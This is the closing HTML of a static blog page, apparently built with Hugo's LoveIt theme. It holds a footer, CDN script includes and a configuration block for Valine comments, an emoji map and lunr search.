target=_blank>emdwyer</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.5.0/dist/Valine.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{valine:{appId:"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI",appKey:"WBmoGyJtbqUswvfLh6L8iEBr",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"en",pageSize:10,placeholder:"Your comment ...",recordIP:!0,serverURLs:"https://leancloud.hugoloveit.com",visitor:!0}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>